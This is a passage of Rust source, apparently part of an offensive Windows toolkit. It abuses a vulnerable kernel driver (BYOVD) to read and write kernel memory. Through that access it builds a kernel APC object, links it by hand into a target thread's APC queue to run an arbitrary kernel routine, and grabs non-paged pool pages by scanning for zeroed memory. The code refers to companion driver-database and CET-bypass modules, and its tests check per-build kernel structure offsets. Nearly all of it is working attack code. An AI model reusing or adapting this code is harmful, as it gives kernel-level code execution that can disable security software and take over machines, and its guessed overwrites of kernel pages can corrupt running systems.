    // Zero the KAPC structure.
    let zeroed = vec![0u8; KAPC_SIZE];
    if !kwrite_bytes(driver, device_handle, cr3, kapc_addr, &zeroed) {
        bail!("failed to zero KAPC structure at {:#x}", kapc_addr);
    }

    // Populate KAPC fields.
    let mut write_field_u64 = |offset: usize, value: u64| -> bool {
        kwrite_u64(driver, device_handle, cr3, kapc_addr + offset as u64, value)
    };
    let write_field_u8 = |offset: usize, value: u8| -> bool {
        kwrite_bytes(
            driver,
            device_handle,
            cr3,
            kapc_addr + offset as u64,
            &[value],
        )
    };

    // DISPATCHER_HEADER: Type = ApcObject (18), Size = KAPC_SIZE / 16
    write_field_u8(KAPC_TYPE_OFFSET + 0, APC_OBJECT_TYPE);
    write_field_u8(KAPC_TYPE_OFFSET + 1, (KAPC_SIZE / 16) as u8);

    // Thread pointer.
    write_field_u64(KAPC_THREAD_OFFSET, kthread_addr);

    // Callbacks.
    write_field_u64(KAPC_KERNEL_ROUTINE_OFFSET, kernel_routine);
    write_field_u64(KAPC_RUNDOWN_ROUTINE_OFFSET, 0); // No rundown routine
    write_field_u64(KAPC_NORMAL_ROUTINE_OFFSET, normal_routine);

    // Context and arguments.
    write_field_u64(KAPC_NORMAL_CONTEXT_OFFSET, normal_context);
    write_field_u64(KAPC_SYSTEM_ARG1_OFFSET, arg1);
    write_field_u64(KAPC_SYSTEM_ARG2_OFFSET, arg2);

    // ApcStateIndex = 0 (OriginalApcEnvironment)
    write_field_u8(KAPC_STATE_INDEX_OFFSET, 0);

    // ApcMode = 0 (KernelMode)
    write_field_u8(KAPC_MODE_OFFSET, 0);

    // Inserted = FALSE
    write_field_u8(KAPC_INSERTED_OFFSET, 0);

    tracing::info!(
        "kernel_apc_pivot: allocated KAPC at {:#x} for KTHREAD {:#x}",
        kapc_addr,
        kthread_addr
    );

    Ok(kapc_addr)
}

/// Queue a kernel APC to a target thread.
///
/// This is the main high-level API.  It:
///   1. Allocates and populates a KAPC structure in kernel memory.
///   2. Calls KeInsertQueueApc to insert it into the target thread's APC queue.
///
/// # Arguments
///
/// * `ctx` - The APC pivot context (target KTHREAD).
/// * `kernel_handler` - Address of the kernel routine to execute.
/// * `arg1`, `arg2` - Arguments passed to the kernel routine.
/// * `driver` - The deployed vulnerable driver.
/// * `device_handle` - Handle to the driver device.
pub fn queue_kernel_apc(
    ctx: &KernelApcContext,
    kernel_handler: u64,
    arg1: u64,
    arg2: u64,
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
) -> Result<u64> {
    let cr3 = ctx.cr3;
    let kernel_base = ctx.kernel_base;

    // Allocate and populate the KAPC.
    let kapc_addr = allocate_kapc(
        driver,
        device_handle,
        cr3,
        kernel_base,
        ctx.kthread_addr,
        kernel_handler,
        0, // NormalRoutine (kernel APC only, no user-mode callback)
        0, // NormalContext
        arg1,
        arg2,
    )?;

    // Resolve KeInsertQueueApc.
    let ke_insert = crate::kernel_callback::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "KeInsertQueueApc",
    )
    .context("failed to resolve KeInsertQueueApc")?;

    // KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, Increment)
    // This is a kernel function — we can't call it directly from user mode.
    // Instead, we manipulate the APC queue list entries directly.
    //
    // Insert the KAPC into the thread's KernelApcPending list:
    //   KAPC_STATE.ApcListHead[0] (kernel APC list)
    //   LIST_ENTRY.Flink/Blink manipulation.

    let (kt_offsets, _) = get_offsets()?;

    // The APC list head is at KTHREAD.ApcState + offset of ApcListHead[0].
    // ApcListHead[0] is at offset 0x00 within KAPC_STATE for kernel APCs.
    let apc_list_head = ctx.kthread_addr + kt_offsets.apc_state as u64;

    // Read the current first entry (Flink of list head).
    let first_apc = kread_u64(driver, device_handle, cr3, apc_list_head)
        .context("failed to read APC list head.Flink")?;

    // Set our KAPC's list entry to point to the head and first entry.
    // LIST_ENTRY: Flink, Blink (8 bytes each).
    let kapc_list_entry_addr = kapc_addr + KAPC_LIST_ENTRY_OFFSET as u64;

    // Our KAPC.Flink = first_apc (or head if list was empty)
    kwrite_u64(driver, device_handle, cr3, kapc_list_entry_addr, first_apc);

    // Our KAPC.Blink = list_head
    kwrite_u64(
        driver,
        device_handle,
        cr3,
        kapc_list_entry_addr + 8,
        apc_list_head,
    );

    // Update the previous first entry's Blink to point to our KAPC.
    if first_apc != apc_list_head {
        kwrite_u64(
            driver,
            device_handle,
            cr3,
            first_apc + 8,
            kapc_list_entry_addr,
        );
    }

    // Update the list head's Flink to point to our KAPC.
    kwrite_u64(
        driver,
        device_handle,
        cr3,
        apc_list_head,
        kapc_list_entry_addr,
    );

    // Mark the KAPC as inserted.
    kwrite_bytes(
        driver,
        device_handle,
        cr3,
        kapc_addr + KAPC_INSERTED_OFFSET as u64,
        &[1],
    );

    tracing::info!(
        "kernel_apc_pivot: queued kernel APC at {:#x} for KTHREAD {:#x} (handler={:#x})",
        kapc_addr,
        ctx.kthread_addr,
        kernel_handler
    );

    Ok(kapc_addr)
}

// ─── Kernel Pool Allocation ───────────────────────────────────────────────

/// Allocate kernel non-paged pool memory.
///
/// Uses kernel symbol resolution to find ExAllocatePool2 (or ExAllocatePoolWithTag
/// on older builds) and calls it via a kernel APC or by directly manipulating
/// kernel structures.
///
/// **Note**: This is a simplified implementation that allocates by writing a
/// call to ExAllocatePool2 into a code cave in kernel memory and executing it.
/// In practice, a production implementation would use a more robust approach.
fn allocate_kernel_pool(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_base: u64,
    size: usize,
) -> Option<u64> {
    // Try ExAllocatePool2 first (Windows 10 2004+).
    let alloc_fn = crate::kernel_callback::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "ExAllocatePool2",
    );

    match alloc_fn {
        Ok(fn_addr) => {
            // ExAllocatePool2(Flags, NumberOfBytes, Tag)
            // Flags = 0x00000041 (NonPagedPoolNx | POOL_FLAG_NON_PAGED)
            // We can't call kernel functions from user mode directly.
            // Instead, use the BYOVD driver's native allocation capability
            // if available, or write a shellcode stub.

            // For this research implementation, we use a simpler approach:
            // find unused memory in the kernel's non-paged pool region by
            // scanning for zeroed pages and claiming one.

            tracing::debug!(
                "kernel_apc_pivot: resolved ExAllocatePool2 at {:#x} (cannot call from usermode)",
                fn_addr
            );
        }
        Err(_) => {
            tracing::debug!(
                "kernel_apc_pivot: ExAllocatePool2 not found, trying ExAllocatePoolWithTag"
            );
        }
    }

    // Fallback: scan for usable kernel memory in the non-paged pool range.
    // The non-paged pool starts at a high virtual address (typically
    // 0xFFFF8000`00000000 or similar).  We look for a contiguous run of
    // zeroed pages.
    //
    // For safety, we use the MmHighestUserAddress + 1 as a starting hint
    // and scan for the pool region.  In practice, we would use
    // MmNonPagedPoolStart resolved via kernel symbol.

    // Resolve MmNonPagedPoolStart for the start address.
    let pool_start = crate::kernel_callback::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "MmNonPagedPoolStart",
    );

    let scan_start = match pool_start {
        Ok(addr) => {
            // Read the pointer value.
            kread_u64(driver, device_handle, cr3, addr).unwrap_or(0xFFFF800000000000)
        }
        Err(_) => 0xFFFF800000000000,
    };

    // Align to page boundary.
    let scan_start = (scan_start + 0xFFF) & !0xFFF;
    let page_size = 4096u64;
    let pages_needed = ((size + 0xFFF) / 0x1000) as u64;

    // Scan for zeroed pages (very conservative — avoids overwriting active data).
    const MAX_SCAN_PAGES: u64 = 1024;
    for page_idx in 0..MAX_SCAN_PAGES {
        let candidate = scan_start + page_idx * page_size;

        // Read a full page and check if it's all zeros.
        let page_data = kread_bytes(driver, device_handle, cr3, candidate, page_size as usize)?;

        if page_data.iter().all(|&b| b == 0) {
            // Found a zeroed page — claim it.
            // Write a marker to prevent reuse.
            let marker: u64 = 0xDEAD_BEEF_CAFE_BABE;
            kwrite_u64(driver, device_handle, cr3, candidate, marker);

            // If we need more than one page, check subsequent pages too.
            if pages_needed > 1 {
                let mut all_clear = true;
                for extra in 1..pages_needed {
                    let extra_data = kread_bytes(
                        driver,
                        device_handle,
                        cr3,
                        candidate + extra * page_size,
                        page_size as usize,
                    );
                    match extra_data {
                        Some(d) if d.iter().all(|&b| b == 0) => {}
                        _ => {
                            all_clear = false;
                            break;
                        }
                    }
                }
                if !all_clear {
                    continue;
                }

                // Mark all pages.
                for extra in 1..pages_needed {
                    kwrite_u64(
                        driver,
                        device_handle,
                        cr3,
                        candidate + extra * page_size,
                        marker,
                    );
                }
            }

            tracing::info!(
                "kernel_apc_pivot: allocated {} bytes at {:#x} in non-paged pool",
                pages_needed * page_size,
                candidate
            );
            return Some(candidate);
        }
    }

    tracing::warn!("kernel_apc_pivot: could not find free kernel memory for allocation");
    None
}

/// Free previously allocated kernel pool memory.
///
/// Writes zeros back to the allocated region to "free" it.  A production
/// implementation would call ExFreePool.
fn free_kernel_pool(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    _cr3: u64,
    _kernel_base: u64,
    addr: u64,
) {
    // Best-effort: zero the first 8 bytes to clear our marker.
    // We can't safely call ExFreePool from user mode.
    tracing::warn!(
        "kernel_apc_pivot: leaking kernel allocation at {:#x} (cannot call ExFreePool from usermode)",
        addr
    );
}

// ─── CR3 Resolution ───────────────────────────────────────────────────────

/// Resolve CR3 by reading PsInitialSystemProcess → EPROCESS.DirectoryTableBase.
///
/// Mirrors the implementation in cet_bypass.rs but self-contained.
fn resolve_cr3(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
) -> Result<u64> {
    let eprocess_ptr_addr = crate::kernel_callback::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "PsInitialSystemProcess",
    )
    .context("failed to resolve PsInitialSystemProcess")?;

    // Read the pointer to get the EPROCESS address.
    let mut ptr_buf = [0u8; 8];
    unsafe {
        crate::kernel_callback::deploy::read_physical_memory(
            driver,
            device_handle,
            eprocess_ptr_addr,
            &mut ptr_buf,
        )
        .context("failed to read PsInitialSystemProcess pointer")?;
    }
    let eprocess_addr = u64::from_le_bytes(ptr_buf);
    if eprocess_addr == 0 {
        bail!("PsInitialSystemProcess is NULL");
    }

    // Read DirectoryTableBase from EPROCESS.
    // _KPROCESS.DirectoryTableBase is at EPROCESS + 0x28.
    const DIRECTORY_TABLE_BASE_OFFSET: u64 = 0x28;
    let mut cr3_buf = [0u8; 8];
    unsafe {
        if driver.needs_physical_addr {
            // Chicken-and-egg: we need CR3 to translate, but we're reading CR3.
            // For physical-address drivers, the driver itself handles kernel VA
            // translation internally (via MmMapIoSpace or equivalent).
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                eprocess_addr + DIRECTORY_TABLE_BASE_OFFSET,
                &mut cr3_buf,
            )
            .context("failed to read DirectoryTableBase")?;
        } else {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                eprocess_addr + DIRECTORY_TABLE_BASE_OFFSET,
                &mut cr3_buf,
            )
            .context("failed to read DirectoryTableBase")?;
        }
    }
    let cr3 = u64::from_le_bytes(cr3_buf);
    if cr3 == 0 {
        bail!("DirectoryTableBase is NULL");
    }

    Ok(cr3)
}

// ─── Initialization ───────────────────────────────────────────────────────

/// Initialize the kernel APC pivot subsystem.
///
/// Must be called before any other function in this module.  Resolves the
/// Windows build number and loads the appropriate offset table.
///
/// # Arguments
///
/// * `driver` - The deployed vulnerable driver.
/// * `device_handle` - Handle to the driver device.
/// * `kernel_base` - Base address of ntoskrnl.exe.
///
/// # Returns
///
/// A `KernelApcContext` on success, or an error if initialization fails.
pub fn init(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
) -> Result<()> {
    // Check if already initialized.
    if OFFSETS.get().is_some() {
        return Ok(());
    }

    // Get the Windows build number.
    let build = get_build_number().context("failed to determine Windows build number")?;
    tracing::info!("kernel_apc_pivot: detected Windows build {}", build);

    // Look up offsets.
    let offsets = offsets_for_build(build)
        .ok_or_else(|| anyhow::anyhow!("no offset table for Windows build {}", build))?;

    // Resolve CR3.
    let ps_initial_addr = crate::kernel_callback::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "PsInitialSystemProcess",
    )
    .context("failed to resolve PsInitialSystemProcess")?;

    // The CR3 resolution needs the EPROCESS.DirectoryTableBase offset.
    // We need to read the EPROCESS pointer first, then read its DTB.
    let needs_phys = driver.needs_physical_addr;

    // For physical-address drivers, we need a CR3 to do anything.
    // Use a bootstrapping approach: read PsInitialSystemProcess with
    // physical addressing directly.
    let cr3 = if needs_phys {
        resolve_cr3(driver, device_handle, kernel_base).context("failed to resolve CR3")?
    } else {
        // For VA-addressable drivers, CR3 is not strictly needed but
        // we store 0 for consistency.
        0
    };

    let _ = OFFSETS.set(offsets);

    tracing::info!(
        "kernel_apc_pivot: initialized for build {} (CR3={:#x})",
        build,
        cr3
    );

    Ok(())
}

/// Resolve the KTHREAD for a given TID and create an APC context.
///
/// Convenience function that combines `resolve_kthread_for_tid` with
/// context creation.
pub fn create_context_for_tid(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
    pid: Option<u32>,
    tid: u32,
) -> Result<KernelApcContext> {
    // Resolve CR3.
    let cr3 = if driver.needs_physical_addr {
        resolve_cr3(driver, device_handle, kernel_base).context("failed to resolve CR3")?
    } else {
        0
    };

    let kthread_addr = resolve_kthread_for_tid(driver, device_handle, cr3, kernel_base, pid, tid)
        .context("failed to resolve KTHREAD for TID")?;

    Ok(KernelApcContext::new(kthread_addr, cr3, kernel_base))
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_offsets_for_build_known() {
        // Windows 10 22H2
        let result = offsets_for_build(19045);
        assert!(result.is_some());
        let (kt, ep) = result.unwrap();
        assert_eq!(kt.kernel_stack, 0x070);
        assert_eq!(ep.unique_process_id, 0x440);
    }

    #[test]
    fn test_offsets_for_build_win11_24h2() {
        let result = offsets_for_build(26100);
        assert!(result.is_some());
        let (kt, ep) = result.unwrap();
        assert_eq!(kt.kernel_stack, 0x058);
        assert_eq!(ep.thread_list_head, 0x5E8);
    }

    #[test]
    fn test_offsets_for_build_unknown_too_old() {
        let result = offsets_for_build(15000);
        assert!(result.is_none());
    }

    #[test]
    fn test_offsets_for_build_forward_compatible() {
        // A future build should get the highest known offset.
        let result = offsets_for_build(27000);
        assert!(result.is_some());
        let (kt, _) = result.unwrap();
        // Should use 26100 (Win11 24H2) offsets.
        assert_eq!(kt.kernel_stack, 0x058);
    }

    #[test]
    fn test_kapc_constants() {
        assert_eq!(KAPC_SIZE, 0x78);
        assert_eq!(APC_OBJECT_TYPE, 18);
        assert_eq!(KAPC_KERNEL_ROUTINE_OFFSET, 0x40);
        assert_eq!(KAPC_NORMAL_ROUTINE_OFFSET, 0x50);
        assert_eq!(KAPC_STATE_INDEX_OFFSET, 0x70);
        assert_eq!(KAPC_MODE_OFFSET, 0x71);
        assert_eq!(KAPC_INSERTED_OFFSET, 0x72);
    }
}
